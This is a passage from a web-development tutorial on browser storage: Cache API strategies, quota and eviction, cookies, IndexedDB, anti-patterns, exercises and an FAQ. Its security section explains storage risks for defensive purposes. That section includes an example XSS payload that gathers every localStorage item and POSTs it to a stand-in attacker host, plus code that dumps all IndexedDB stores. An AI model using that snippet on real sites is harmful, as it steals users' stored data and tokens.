    event.respondWith(networkFirstStrategy(request));
  } else {
    // Static resources: Cache First
    event.respondWith(cacheFirstStrategy(request));
  }
});

async function cacheFirstStrategy(request) {
  const cached = await caches.match(request);
  if (cached) return cached;

  try {
    const response = await fetch(request);
    if (response.ok) {
      const cache = await caches.open(CACHE_NAME);
      cache.put(request, response.clone());
    }
    return response;
  } catch {
    return new Response('Offline', { status: 503 });
  }
}

async function networkFirstStrategy(request) {
  try {
    const response = await fetch(request);
    if (response.ok) {
      const cache = await caches.open(CACHE_NAME);
      cache.put(request, response.clone());
    }
    return response;
  } catch {
    const cached = await caches.match(request);
    if (cached) return cached;
    return new Response(
      JSON.stringify({ error: 'Offline' }),
      { status: 503, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
```

---

## 6. Storage API and Capacity Management

### 6.1 StorageManager API

This API is used to check the storage capacity allocated to an origin by the browser
and to request persistence.

```javascript
// ===== StorageManager API =====

async function checkStorageStatus() {
  if (!navigator.storage || !navigator.storage.estimate) {
    console.warn('StorageManager API is not supported.');
    return null;
  }

  const estimate = await navigator.storage.estimate();

  const status = {
    // Usage
    usage: estimate.usage,
    usageMB: (estimate.usage / 1024 / 1024).toFixed(2),

    // Quota
    quota: estimate.quota,
    quotaMB: (estimate.quota / 1024 / 1024).toFixed(2),
    quotaGB: (estimate.quota / 1024 / 1024 / 1024).toFixed(2),

    // Usage percentage
    percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2),

    // Breakdown by storage (Chrome only)
    usageDetails: estimate.usageDetails || null,
  };

  console.table(status);
  return status;
}

// Example output:
// {
//   usage: 5242880,
//   usageMB: '5.00',
//   quota: 2147483648,
//   quotaMB: '2048.00',
//   quotaGB: '2.00',
//   percentUsed: '0.24',
//   usageDetails: {
//     indexedDB: 4194304,
//     caches: 1048576,
//     serviceWorkerRegistrations: 0,
//   }
// }


// ===== Requesting persistent storage =====

async function requestPersistentStorage() {
  if (!navigator.storage || !navigator.storage.persist) {
    console.warn('Persistent storage is not supported.');
    return false;
  }

  // Check if already persisted
  const alreadyPersisted = await navigator.storage.persisted();
  if (alreadyPersisted) {
    console.log('Storage is already persistent.');
    return true;
  }

  // Request persistence
  const granted = await navigator.storage.persist();

  if (granted) {
    console.log('Storage is now persistent. Data will not be evicted.');
  } else {
    console.warn(
      'Persistent storage was denied. Data may be evicted under pressure.'
    );
  }

  return granted;
}

// Conditions under which browsers grant persistence (Chrome):
// - The site is bookmarked
// - The site has high engagement (High Engagement)
// - Push notification permission is granted
// - Added to the home screen
// Firefox always shows a prompt to the user
```

### 6.2 Storage Eviction Mechanism

When the browser's disk space runs low, data for origins that have not been persisted
may be automatically deleted.

```
┌──────────────────────────────────────────────────────────┐
│           Storage Eviction Flow                            │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Disk space runs low                                     │
│       │                                                  │
│       ▼                                                  │
│  ┌─────────────────────────────────────────────┐         │
│  │ Persisted origins (persisted = true)         │         │
│  │ → Not deleted                                │         │
│  └─────────────────────────────────────────────┘         │
│                                                          │
│  ┌─────────────────────────────────────────────┐         │
│  │ Best-Effort origins (persisted = false)      │         │
│  │ → Deleted in LRU (Least Recently Used) order │         │
│  │                                              │         │
│  │   Deletion order:                            │         │
│  │   1. The least recently used origin          │         │
│  │   2. All data for that origin is deleted:    │         │
│  │      - IndexedDB                             │         │
│  │      - Cache API                             │         │
│  │      - Service Worker registrations          │         │
│  │      - localStorage (some browsers)          │         │
│  │                                              │         │
│  │   Note: Cookies are NOT subject to eviction  │         │
│  └─────────────────────────────────────────────┘         │
│                                                          │
│  Capacity allocation policy by browser:                  │
│  ┌────────────┬──────────────────────────────┐           │
│  │ Chrome     │ Up to 80% of free disk space │           │
│  │            │ (up to 60% per origin)        │           │
│  │ Firefox    │ Up to 50% of free disk space │           │
│  │            │ (up to 2GB per origin)        │           │
│  │ Safari     │ Up to 1GB (expandable w/ user permission)│
│  └────────────┴──────────────────────────────┘           │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

## 7. Security and Privacy

### 7.1 XSS and Storage

If a Cross-Site Scripting (XSS) attack succeeds, the attacker can access
all client-side storage for that origin.

```javascript
// ===== Operations an XSS attacker can perform =====

// Stealing all localStorage data
const stolen = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  stolen[key] = localStorage.getItem(key);
}
// Send to attacker's server
fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: JSON.stringify(stolen),
});

// Stealing all IndexedDB data
const databases = await indexedDB.databases();
for (const dbInfo of databases) {
  const db = await openDB(dbInfo.name, dbInfo.version);
  for (const storeName of db.objectStoreNames) {
    const data = await db.getAll(storeName);
    // Steal...
  }
}

// HttpOnly Cookies are protected because they cannot be accessed from document.cookie
// → Always set HttpOnly on session Cookies


// ===== Countermeasures =====

// 1. Prohibit inline scripts with CSP (Content Security Policy)
// Content-Security-Policy: script-src 'self' 'nonce-abc123'

// 2. Do not store sensitive data in storage
// BAD: localStorage.setItem('jwt', token);
// GOOD: Store session ID in an HttpOnly Cookie

// 3. Sanitize and escape input
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 4. Use the Trusted Types API
// Content-Security-Policy: trusted-types myPolicy
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => DOMPurify.sanitize(input),
  });
}
```

### 7.2 Third-Party Cookies and Privacy

Third-party cookies have been used for cross-site tracking, but
are being gradually phased out from a privacy protection perspective.

```
┌──────────────────────────────────────────────────────────────┐
│        First-Party vs Third-Party Cookie                      │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  While a user is visiting https://news.example.com:          │
│                                                              │
│  First-party:                                                │
│  ┌──────────────────┐    Cookie                              │
│  │ news.example.com │ <─────────> news.example.com           │
│  └──────────────────┘    (same domain)                       │
│                                                              │
│  Third-party:                                                │
│  ┌──────────────────┐    Cookie                              │
│  │ news.example.com │ <─────────> ads.tracker.com            │
│  │ (embedded inside)│    (different domain = third-party)    │
│  └──────────────────┘                                        │
│                                                              │
│  Status in major browsers:                                   │
│  ┌──────────┬─────────────────────────────────────────┐      │
│  │ Safari   │ ITP (since 2017): Fully blocks 3rd-party cookies│
│  │ Firefox  │ ETP (since 2019): Blocks tracker cookies │      │
│  │ Chrome   │ Transitioning to Privacy Sandbox + Topics API  │
│  └──────────┴─────────────────────────────────────────┘      │
│                                                              │
│  Alternative technologies:                                   │
│  - Privacy Sandbox (Chrome): Topics, Attribution Reporting   │
│  - Storage Access API: Third-party explicitly requests        │
│    storage access                                            │
│  - CHIPS (Cookies Having Independent Partitioned State):     │
│    Partitioned cookies                                       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 7.3 Behavior in Private Browsing Mode

```javascript
// ===== Storage behavior in private browsing =====

// Behavior differs by browser:
//
// Chrome (Incognito mode):
//   - localStorage: Works normally, but cleared when window is closed
//   - sessionStorage: Works normally
//   - IndexedDB: Works normally, but cleared when window is closed
//   - Cookie: Works normally, but cleared when window is closed
//
// Safari (Private):
//   - localStorage: Read-only (writing throws error) → Improved in recent versions
//   - sessionStorage: Works normally
//   - IndexedDB: Available but with strict capacity limits
//
// Firefox (Private):
//   - All storage works normally, but cleared when window is closed

// Detecting private mode (not recommended, for reference only)
async function isPrivateBrowsing() {
  try {
    // Detection for Safari
    localStorage.setItem('__test__', '1');
    localStorage.removeItem('__test__');
  } catch {
    return true; // Old Safari private mode
  }

  try {
    // If storage quota is extremely small
    const estimate = await navigator.storage?.estimate();
    if (estimate && estimate.quota < 120 * 1024 * 1024) {
      return true; // Probably private mode
    }
  } catch {
    // Ignore
  }

  return false;
}
```

---

## 8. Storage Selection Decision Tree

Here is a flowchart for systematically deciding on storage selection based on use case.

```
What data do you want to store?
│
├── Authentication info (session ID, token)
│   └── Cookie (HttpOnly, Secure, SameSite=Lax)
│       * Storing JWT in localStorage/sessionStorage is not recommended
│
├── User settings (theme, language, display settings)
│   ├── Also save to server?
│   │   ├── Yes → Server DB + Cookie for user identification
│   │   └── No  → localStorage
│   └── Need independent settings per tab?
│       ├── Yes → sessionStorage
│       └── No  → localStorage
│
├── Temporary form save
│   └── sessionStorage (auto-cleared when tab closes)
│       + Periodic auto-save (setInterval)
│
├── Large amounts of structured data (hundreds of records or more)
│   └── IndexedDB
│       ├── Search required → Define indexes
│       ├── Binary data → Store Blob/ArrayBuffer directly
│       └── Offline support → Integrate with Service Worker
│
├── Caching HTTP responses
│   └── Cache API + Service Worker
│
└── Small data that needs to be sent to the server automatically
    └── Cookie (within 4KB)
```

### 8.2 Best Practices Table for Storage Selection

| Use case | Recommended storage | Reason |
|----------|-------------------|--------|
| Session management | Cookie (HttpOnly) | Auto server send, XSS resistance |
| JWT token | Cookie (HttpOnly) | localStorage is vulnerable to XSS |
| Dark mode setting | localStorage | Persistent, shared across all tabs |
| Language setting | localStorage | Persistent, shared across all tabs |
| Form draft | sessionStorage | Per-tab, cleared when closed |
| Wizard progress | sessionStorage | Per-tab temporary state |
| Product catalog | IndexedDB | Large data, searchable |
| Offline email | IndexedDB | Structured data, persistent |
| Image cache | Cache API | Request/Response pairs |
| API response | Cache API or IndexedDB | Depends on use case |
| A/B test flag | Cookie | Server-side determination |
| GDPR consent state | Cookie + localStorage | Server send + UI state |

---

## 9. Anti-Patterns and Correct Design

### 9.1 Anti-Pattern 1: Storing Auth Tokens in localStorage

Storing JWTs or access tokens in localStorage is a common pattern, but
it carries serious security risks.

```javascript
// ===== Anti-pattern: Storing JWT in localStorage =====

// BAD: This pattern is vulnerable to XSS
async function loginBad(email, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  const { accessToken, refreshToken } = await response.json();

  // BAD: Easily stolen by XSS attacks
  localStorage.setItem('accessToken', accessToken);
  localStorage.setItem('refreshToken', refreshToken);
}

// BAD: Manual setup required for every request
async function fetchWithAuthBad(url) {
  const token = localStorage.getItem('accessToken');
  return fetch(url, {
    headers: { Authorization: `Bearer ${token}` },
  });
}

// Problems:
// 1. If even one XSS exists, all tokens are stolen
// 2. If the refresh token is stolen, long-term access is allowed
// 3. Always accessible from JavaScript (no protection mechanism)
// 4. CSRF is not needed, but the XSS risk exceeds the CSRF risk


// ===== Correct pattern: HttpOnly Cookie =====

// Server side (Express example)
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticate(email, password);

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const sessionId = generateSecureSessionId();
  await saveSession(sessionId, user.id);

  // Set in HttpOnly Cookie → Not accessible from JavaScript
  res.cookie('sid', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
    path: '/',
  });

  res.json({ user: { id: user.id, name: user.name } });
});

// Client side: No manual setup needed since Cookies are sent automatically
async function fetchWithAuthGood(url) {
  return fetch(url, {
    credentials: 'include', // Include Cookies
  });
}
```

### 9.2 Anti-Pattern 2: Using localStorage to Cache Large-Scale Data

```javascript
// ===== Anti-pattern: Storing large data in localStorage =====

// BAD: Synchronous API blocks the main thread
async function cacheProductsBad() {
  const response = await fetch('/api/products');
  const products = await response.json(); // 10,000 records

  // BAD: JSON.stringify takes time and freezes the UI
  localStorage.setItem('products', JSON.stringify(products));
  // Plus localStorage has a 5-10MB limit
}

function getProductBad(id) {
  // BAD: Parses all 10,000 records every time (can take hundreds of milliseconds)
  const products = JSON.parse(localStorage.getItem('products'));
  return products.find(p => p.id === id);
}

// Problems:
// 1. JSON.stringify / JSON.parse is synchronous and blocks the UI
// 2. Easily reaches the 5-10MB capacity limit
// 3. Cannot use indexes for searching; requires a full data scan
// 4. Cannot partially update data (must rewrite everything)


// ===== Correct pattern: Use IndexedDB =====

import { openDB } from 'idb';

async function cacheProductsGood() {
  const db = await openDB('ProductCache', 1, {
    upgrade(db) {
      const store = db.createObjectStore('products', { keyPath: 'id' });
      store.createIndex('category', 'category');
      store.createIndex('price', 'price');
    },
  });

  const response = await fetch('/api/products');
  const products = await response.json();

  // Async bulk insert (does not block the UI)
  const tx = db.transaction('products', 'readwrite');
  const store = tx.objectStore('products');
  for (const product of products) {
    store.put(product);
  }
  await tx.done;
}

async function getProductGood(id) {
  const db = await openDB('ProductCache', 1);
  // Fast O(log n) search by index
  return db.get('products', id);
}

async function getProductsByCategory(category) {
  const db = await openDB('ProductCache', 1);
  return db.getAllFromIndex('products', 'category', category);
}

async function getProductsInPriceRange(min, max) {
  const db = await openDB('ProductCache', 1);
  return db.getAllFromIndex(
    'products',
    'price',
    IDBKeyRange.bound(min, max)
  );
}
```

### 9.3 Anti-Pattern 3: Stuffing User Settings into Cookies

```javascript
// ===== Anti-pattern: Storing large amounts of user settings in Cookies =====

// BAD: Cookies are sent with every request, wasting bandwidth
document.cookie = 'theme=dark; path=/';
document.cookie = 'language=en; path=/';
document.cookie = 'fontSize=16; path=/';
document.cookie = 'sidebarOpen=true; path=/';
document.cookie = 'tablePageSize=25; path=/';
document.cookie = 'notifications=true; path=/';
document.cookie = 'colorScheme=blue; path=/';

// Problems:
// 1. These cookies are attached to every request (including images, CSS, JS)
// 2. Easily reaches the 4KB capacity limit
// 3. May run into the cookie count limit (approximately 50 per domain)
// 4. Server receives unnecessary data

// ===== Correct pattern =====
// Store user settings in localStorage
// Use Cookies only for auth/session management
const userSettings = {
  theme: 'dark',
  language: 'en',
  fontSize: 16,
  sidebarOpen: true,
  tablePageSize: 25,
  notifications: true,
  colorScheme: 'blue',
};
localStorage.setItem('userSettings', JSON.stringify(userSettings));
```

---

## 10. Edge Case Analysis

### 10.1 Storage Restrictions Due to Safari ITP

Safari's Intelligent Tracking Prevention (ITP) imposes additional restrictions on
storage to prevent tracking.

```javascript
// ===== Safari ITP storage restrictions =====

// Safari storage restrictions (when ITP is enabled):
//
// 1. For domains classified as having cross-site tracking capabilities:
//    - Cookie: Expires after 24 hours (even first-party)
//    - localStorage: Deleted after 7 days without access
//    - IndexedDB: Deleted after 7 days without access
//    - Service Worker: Registration removed after 7 days without access
//
// 2. Cookies set via document.cookie:
//    - Max-Age/Expires is capped at 7 days
//    - Does not apply to cookies set via Set-Cookie header
//
// 3. Cases requiring Storage Access API:
//    - Storage access in a third-party iframe

// Countermeasure: Use the Storage Access API
async function requestStorageAccess() {
  try {
    const hasAccess = await document.hasStorageAccess();
    if (!hasAccess) {
      // Must be called inside a user interaction (click, etc.)
      await document.requestStorageAccess();
      console.log('Storage access granted.');
    }
  } catch (err) {
    console.warn('Storage access denied:', err.message);
  }
}

// Countermeasure: Setting Cookies on the server side
// Using Set-Cookie header instead of document.cookie
// avoids the forced shortening of expiration by ITP

// Express example
app.get('/api/set-preference', (req, res) => {
  res.cookie('preference', req.query.value, {
    httpOnly: false,      // Make readable from client if needed
    secure: true,
    sameSite: 'lax',
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1 year
  });
  res.json({ success: true });
});
```

### 10.2 Handling Environments Where Storage is Unavailable

There are surprisingly many cases where storage APIs are unavailable.
iframe sandbox attributes, browser settings, and restrictions by extensions can be the cause.

```javascript
// ===== Availability check and fallback for storage =====

class StorageAdapter {
  constructor() {
    this.backend = this.detectBackend();
    this.memoryFallback = new Map();
  }

  detectBackend() {
    // 1. Is localStorage available?
    try {
      const testKey = '__storage_test__';
      localStorage.setItem(testKey, 'test');
      localStorage.removeItem(testKey);
      return 'localStorage';
    } catch {
      // localStorage is not available
    }

    // 2. Is sessionStorage available?
    try {
      const testKey = '__storage_test__';
      sessionStorage.setItem(testKey, 'test');
      sessionStorage.removeItem(testKey);
      return 'sessionStorage';
    } catch {
      // sessionStorage is also not available
    }

    // 3. Are Cookies available?
    try {
      document.cookie = '__storage_test__=1';
      const hasCookie = document.cookie.includes('__storage_test__');
      document.cookie = '__storage_test__=; max-age=0';
      if (hasCookie) return 'cookie';
    } catch {
      // Cookies are also not available
    }

    // 4. If nothing is available, fall back to memory
    console.warn('No persistent storage available. Using in-memory storage.');
    return 'memory';
  }

  getItem(key) {
    switch (this.backend) {
      case 'localStorage':
        return localStorage.getItem(key);
      case 'sessionStorage':
        return sessionStorage.getItem(key);
      case 'cookie': {
        const match = document.cookie.match(
          new RegExp(`(?:^|; )${encodeURIComponent(key)}=([^;]*)`)
        );
        return match ? decodeURIComponent(match[1]) : null;
      }
      case 'memory':
        return this.memoryFallback.get(key) ?? null;
    }
  }

  setItem(key, value) {
    switch (this.backend) {
      case 'localStorage':
        localStorage.setItem(key, value);
        break;
      case 'sessionStorage':
        sessionStorage.setItem(key, value);
        break;
      case 'cookie':
        document.cookie =
          `${encodeURIComponent(key)}=${encodeURIComponent(value)}; ` +
          'max-age=31536000; path=/; samesite=lax';
        break;
      case 'memory':
        this.memoryFallback.set(key, value);
        break;
    }
  }

  removeItem(key) {
    switch (this.backend) {
      case 'localStorage':
        localStorage.removeItem(key);
        break;
      case 'sessionStorage':
        sessionStorage.removeItem(key);
        break;
      case 'cookie':
        document.cookie =
          `${encodeURIComponent(key)}=; max-age=0; path=/`;
        break;
      case 'memory':
        this.memoryFallback.delete(key);
        break;
    }
  }
}

// Usage example
const storage = new StorageAdapter();
console.log(`Using ${storage.backend} as storage backend`);
storage.setItem('theme', 'dark');
const theme = storage.getItem('theme');
```

### 10.3 IndexedDB onblocked Event and Version Conflicts

When using the same IndexedDB across multiple tabs, conflicts can occur
between tabs during a version upgrade.

```javascript
// ===== Handling IndexedDB version conflicts =====

// Tab A: Connected with old version (v1)
// Tab B: Tries to open with new version (v2)

// Code for Tab B
const db = await openDB('MyApp', 2, {
  upgrade(db, oldVersion) {
    // This code runs after all old connections are closed
    if (oldVersion < 2) {
      db.createObjectStore('newStore', { keyPath: 'id' });
    }
  },
  blocked(currentVersion, blockedVersion, event) {
    // Waiting here until Tab A closes its v1 connection
    console.warn(
      `Upgrade from v${currentVersion} to v${blockedVersion} is blocked.`
    );
    // Prompt the user to close other tabs
    showNotification(
      'An app update is available. Please close other tabs and reload.'
    );
  },
  blocking(currentVersion, blockedVersion, event) {
    // This tab is on an old version and another tab is trying to upgrade
    console.warn('This tab is blocking a database upgrade.');
    // Close our connection to allow the upgrade
    db.close();
    // Reload to connect with the new version
    window.location.reload();
  },
});

// ===== Recommended implementation pattern for onversionchange =====

// For the native API
const request = indexedDB.open('MyApp', 2);
request.onsuccess = (event) => {
  const db = event.target.result;

  db.onversionchange = () => {
    // Another tab requested a version upgrade
    db.close();
    alert('The database has been updated. Please reload the page.');
    window.location.reload();
  };
};
```

---

## 11. Practice Exercises

### 11.1 Beginner Exercise: Persisting Theme Settings

Implement a feature that persists dark mode / light mode settings in the browser using localStorage.

```javascript
// ===== Exercise 1: Persisting theme settings =====

// Requirements:
// 1. Restore saved theme on page load
// 2. Save to localStorage when the theme toggle button is pressed
// 3. Sync when theme changes in other tabs
// 4. Use the system color scheme setting as the default

// --- Sample answer ---

class ThemeManager {
  constructor() {
    this.STORAGE_KEY = 'app_theme';
    this.currentTheme = this.loadTheme();
    this.applyTheme(this.currentTheme);
    this.setupListeners();
  }

  loadTheme() {
    const saved = localStorage.getItem(this.STORAGE_KEY);
    if (saved === 'dark' || saved === 'light') {
      return saved;
    }
    // Use system settings if no saved value
    return window.matchMedia('(prefers-color-scheme: dark)').matches
      ? 'dark'
      : 'light';
  }

  applyTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    document.documentElement.classList.toggle('dark', theme === 'dark');
    this.currentTheme = theme;
  }

  toggle() {
    const newTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
    this.applyTheme(newTheme);
    localStorage.setItem(this.STORAGE_KEY, newTheme);
  }

  setupListeners() {
    // Detect changes from other tabs
    window.addEventListener('storage', (event) => {
      if (event.key === this.STORAGE_KEY && event.newValue) {
        this.applyTheme(event.newValue);
      }
    });

    // Detect system setting changes
    window.matchMedia('(prefers-color-scheme: dark)')
      .addEventListener('change', (event) => {
        // Follow system setting if no saved value in localStorage
        if (!localStorage.getItem(this.STORAGE_KEY)) {
          this.applyTheme(event.matches ? 'dark' : 'light');
        }
      });
  }
}

// Usage
const themeManager = new ThemeManager();
document.getElementById('theme-toggle')
  .addEventListener('click', () => themeManager.toggle());
```

### 11.2 Intermediate Exercise: Task Manager App with IndexedDB

Implement a task management feature with CRUD operations, search, and sorting using IndexedDB.

```javascript
// ===== Exercise 2: IndexedDB implementation of a task manager app =====

// Requirements:
// 1. CRUD for tasks (add, get, update, delete)
// 2. Filter by status
// 3. Sort by due date
// 4. Aggregate by category
// 5. Bulk operations (bulk status change)

// --- Sample answer ---

import { openDB } from 'idb';

class TaskRepository {
  constructor() {
    this.dbPromise = this.initDB();
  }

  async initDB() {
    return openDB('TaskApp', 1, {
      upgrade(db) {
        const store = db.createObjectStore('tasks', {
          keyPath: 'id',
          autoIncrement: true,
        });
        store.createIndex('status', 'status');
        store.createIndex('category', 'category');
        store.createIndex('dueDate', 'dueDate');
        store.createIndex('priority', 'priority');
        store.createIndex('status_priority', ['status', 'priority']);
      },
    });
  }

  async create(taskData) {
    const db = await this.dbPromise;
    const task = {
      ...taskData,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    const id = await db.add('tasks', task);
    return { ...task, id };
  }

  async getById(id) {
    const db = await this.dbPromise;
    return db.get('tasks', id);
  }

  async getAll() {
    const db = await this.dbPromise;
    return db.getAll('tasks');
  }

  async getByStatus(status) {
    const db = await this.dbPromise;
    return db.getAllFromIndex('tasks', 'status', status);
  }

  async getByCategory(category) {
    const db = await this.dbPromise;
    return db.getAllFromIndex('tasks', 'category', category);
  }

  async getDueBefore(date) {
    const db = await this.dbPromise;
    const range = IDBKeyRange.upperBound(date.toISOString());
    return db.getAllFromIndex('tasks', 'dueDate', range);
  }

  async update(id, updates) {
    const db = await this.dbPromise;
    const task = await db.get('tasks', id);
    if (!task) throw new Error(`Task ${id} not found`);

    const updated = {
      ...task,
      ...updates,
      updatedAt: new Date().toISOString(),
    };
    await db.put('tasks', updated);
    return updated;
  }

  async remove(id) {
    const db = await this.dbPromise;
    await db.delete('tasks', id);
  }

  async bulkUpdateStatus(ids, newStatus) {
    const db = await this.dbPromise;
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');

    const operations = ids.map(async (id) => {
      const task = await store.get(id);
      if (task) {
        task.status = newStatus;
        task.updatedAt = new Date().toISOString();
        await store.put(task);
      }
    });

    await Promise.all([...operations, tx.done]);
  }

  async getCategorySummary() {
    const db = await this.dbPromise;
    const allTasks = await db.getAll('tasks');

    return allTasks.reduce((summary, task) => {
      const cat = task.category || 'uncategorized';
      if (!summary[cat]) {
        summary[cat] = { total: 0, pending: 0, done: 0 };
      }
      summary[cat].total++;
      summary[cat][task.status]++;
      return summary;
    }, {});
  }
}

// Usage example
const repo = new TaskRepository();

await repo.create({
  title: 'Create API specification',
  status: 'pending',
  priority: 'high',
  category: 'documentation',
  dueDate: '2025-07-15',
});

const pending = await repo.getByStatus('pending');
console.log('Pending tasks:', pending);

const summary = await repo.getCategorySummary();
console.log('Category summary:', summary);
```

### 11.3 Advanced Exercise: Offline Data Sync Mechanism

Design a mechanism that combines IndexedDB and Service Worker to allow reading and writing data
even when offline, and automatically syncs with the server when back online.

```javascript
// ===== Exercise 3: Offline data sync =====

// Requirements:
// 1. Save data changes to a queue while offline
// 2. Send queued items to the server sequentially when back online
// 3. Conflict detection (optimistic locking: compare by updatedAt)
// 4. Retry mechanism (exponential backoff)
// 5. UI display of sync status

// --- Sample answer ---

import { openDB } from 'idb';

class SyncManager {
  constructor(apiBaseUrl) {
    this.apiBaseUrl = apiBaseUrl;
    this.dbPromise = this.initDB();
    this.isSyncing = false;
    this.listeners = new Set();
    this.setupConnectivityListener();
  }

  async initDB() {
    return openDB('SyncApp', 1, {
      upgrade(db) {
        // Main data store
        const dataStore = db.createObjectStore('data', { keyPath: 'id' });
        dataStore.createIndex('syncStatus', 'syncStatus');

        // Sync queue
        const queueStore = db.createObjectStore('syncQueue', {
          keyPath: 'queueId',
          autoIncrement: true,
        });
        queueStore.createIndex('createdAt', 'createdAt');
        queueStore.createIndex('retryCount', 'retryCount');
      },
    });
  }

  // Write operation that works offline too
  async write(collection, data) {
    const db = await this.dbPromise;

    const record = {
      ...data,
      id: data.id || crypto.randomUUID(),
      updatedAt: new Date().toISOString(),
      syncStatus: 'pending',
    };

    // Save to local DB immediately
    await db.put('data', record);

    // Add to sync queue
    await db.add('syncQueue', {
      type: 'WRITE',
      collection,
      data: record,
      createdAt: new Date().toISOString(),
      retryCount: 0,
    });

    // If online, try to sync immediately
    if (navigator.onLine) {
      this.syncAll();
    }

    this.notifyListeners('write', record);
    return record;
  }

  // Send all items in sync queue
  async syncAll() {
    if (this.isSyncing) return;
    this.isSyncing = true;
    this.notifyListeners('syncStart', null);

    try {
      const db = await this.dbPromise;
      const queue = await db.getAllFromIndex(
        'syncQueue', 'createdAt'
      );

      for (const item of queue) {
        try {
          await this.processQueueItem(item);
          await db.delete('syncQueue', item.queueId);

          // Update syncStatus in local data
          const record = await db.get('data', item.data.id);
          if (record) {
            record.syncStatus = 'synced';
            await db.put('data', record);
          }
        } catch (err) {
          if (err.status === 409) {
            // Conflict: Overwrite with server-side data
            await this.resolveConflict(item);
            await db.delete('syncQueue', item.queueId);
          } else {
            // Retry
            item.retryCount++;
            if (item.retryCount >= 5) {
              console.error('Max retries reached. Dropping item:', item);
              await db.delete('syncQueue', item.queueId);
              this.notifyListeners('syncError', item);
            } else {
              await db.put('syncQueue', item);
              // Wait with exponential backoff
              const delay = Math.pow(2, item.retryCount) * 1000;
              await new Promise(r => setTimeout(r, delay));
            }
          }
        }
      }

      this.notifyListeners('syncComplete', null);
    } finally {
      this.isSyncing = false;
    }
  }

  async processQueueItem(item) {
    const response = await fetch(
      `${this.apiBaseUrl}/${item.collection}/${item.data.id}`,
      {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(item.data),
      }
    );

    if (!response.ok) {
      const error = new Error(`Sync failed: ${response.status}`);
      error.status = response.status;
      throw error;
    }

    return response.json();
  }

  async resolveConflict(item) {
    // Optimistic locking: retrieve server data and compare
    const response = await fetch(
      `${this.apiBaseUrl}/${item.collection}/${item.data.id}`
    );
    const serverData = await response.json();

    const db = await this.dbPromise;
    // Overwrite with server-side data (Last-Write-Wins)
    serverData.syncStatus = 'synced';
    await db.put('data', serverData);

    this.notifyListeners('conflict', {
      local: item.data,
      server: serverData,
    });
  }

  setupConnectivityListener() {
    window.addEventListener('online', () => {
      console.log('Back online. Starting sync...');
      this.syncAll();
    });
  }

  onSync(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  notifyListeners(event, data) {
    for (const listener of this.listeners) {
      listener(event, data);
    }
  }
}

// Usage example
const sync = new SyncManager('https://api.example.com');

sync.onSync((event, data) => {
  switch (event) {
    case 'syncStart':
      showSpinner('Syncing...');
      break;
    case 'syncComplete':
      hideSpinner();
      showToast('Sync complete');
      break;
    case 'conflict':
      showToast(`Conflict occurred: ${data.local.id}`);
      break;
    case 'syncError':
      showToast('Sync error occurred', 'error');
      break;
  }
});

// Saved locally immediately even when offline
await sync.write('tasks', {
  title: 'Task created while offline',
  status: 'pending',
});
```

---

## 12. FAQ (Frequently Asked Questions)

### Q1: How should I choose between localStorage, sessionStorage, and IndexedDB?

The choice between the three is determined by the **persistence**, **capacity**, and **structural complexity** of the data.

**localStorage**:
- **Use cases**: User settings, theme, language selection, UI state (sidebar open/closed, etc.)
- **Characteristics**: Persists when browser is closed, shared across all tabs of the same origin
- **Capacity**: About 5MB (strings only)
- **Suitable for**: Lightweight settings data that you want to keep across browser restarts

**sessionStorage**:
- **Use cases**: Temporary form saves, wizard progress state, tab-specific session info
- **Characteristics**: Automatically deleted when tab is closed, not shared with other tabs
- **Capacity**: About 5MB (strings only)
- **Suitable for**: Temporary data that should be independent between tabs (e.g., filling out multiple forms in separate tabs)

**IndexedDB**:
- **Use cases**: Offline app database, large amounts of structured data, binary data (images, files)
- **Characteristics**: Async API, transaction support, index-based search, GB-scale capacity
- **Suitable for**: Handling hundreds to thousands of records, complex search required, offline support is essential

**Selection flowchart**:
```
Is the data 1MB or more?
 └─ YES → IndexedDB
 └─ NO → Is it OK if it disappears when the tab is closed?
          └─ YES → sessionStorage
          └─ NO → localStorage
```

Practical combination examples:
- **E-commerce site**: Cart info (localStorage), form input in progress (sessionStorage), order history (IndexedDB)
- **Chat app**: User settings (localStorage), current conversation (sessionStorage), all message history (IndexedDB)

### Q2: What happens when storage capacity is exceeded and how do I handle it?

When storage exceeds its capacity limit, a `QuotaExceededError` (DOMException) is thrown. Not handling this exception properly can cause the application to crash.

**Error handling implementation**:
```javascript
// For localStorage
try {
  localStorage.setItem('key', largeData);
} catch (error) {
  if (error.name === 'QuotaExceededError') {
    console.error('Insufficient capacity: storage is full');
    // Response: delete old data
    cleanupOldData();
    // Retry
    try {
      localStorage.setItem('key', largeData);
    } catch (retryError) {
      // If it still fails, notify the user
      showNotification('Storage capacity is insufficient. Please delete unnecessary data.');
    }
  }
}

// For IndexedDB (occurs as a transaction error)
const transaction = db.transaction(['store'], 'readwrite');
const store = transaction.objectStore('store');
const request = store.add(data);

request.onerror = (event) => {
  if (event.target.error.name === 'QuotaExceededError') {
    console.error('IndexedDB capacity insufficient');
    // Delete old data with LRU cache implementation, etc.
  }
};
```

**Capacity monitoring (Storage API)**:
```javascript
// Get current usage and available capacity
if ('storage' in navigator && 'estimate' in navigator.storage) {
  const estimate = await navigator.storage.estimate();
  const usageInMB = (estimate.usage / 1024 / 1024).toFixed(2);
